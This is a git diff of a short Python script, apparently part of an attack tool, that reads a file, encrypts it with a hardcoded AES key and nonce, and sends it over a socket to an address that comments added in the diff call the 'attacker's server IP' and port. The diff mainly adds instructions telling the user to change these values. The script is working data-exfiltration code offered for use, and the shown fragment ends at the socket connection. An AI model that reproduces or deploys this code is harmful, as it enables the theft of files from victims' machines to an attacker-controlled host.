@@ -1,28 +1,27 @@
 import socket
 import time
-
 from Crypto.Cipher import AES
 import os
 import subprocess
 
 
 def get_cipher_from_data(data):
-    key = b"SymmetricKeyMike"
-    nonce = b"SymmetricKeyNce"
+    key = b"SymmetricKeyMike" # CHANGE THE ENCRYPTION KEY (IF YOU WISH. MUST BE THE SAME ON BOTH SIDES)
+    nonce = b"SymmetricKeyNce" # CHANGE THE ENCRYPTION NONCE (IF YOU WISH. MUST BE THE SAME ON BOTH SIDES)
     cipher = AES.new(key, AES.MODE_EAX, nonce)
     return cipher.encrypt(data)
 
 
 def send_file(file_path, client_socket):
-    # Open the file in binary read mode
     with open(file_path, 'rb') as file:
-        # Read and send data in chunks
         data = file.read()
         client_socket.sendall(get_cipher_from_data(data))
 
+####
+ip = "192.168.63.218" # CHANGE THIS (ATTACKER'S SERVER IP)
+port = 4045 # CHANGE THIS (ATTACKER'S SERVER PORT)
+####
 
-ip = "192.168.63.218"
-port = 4045
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 sock.connect((ip, port))
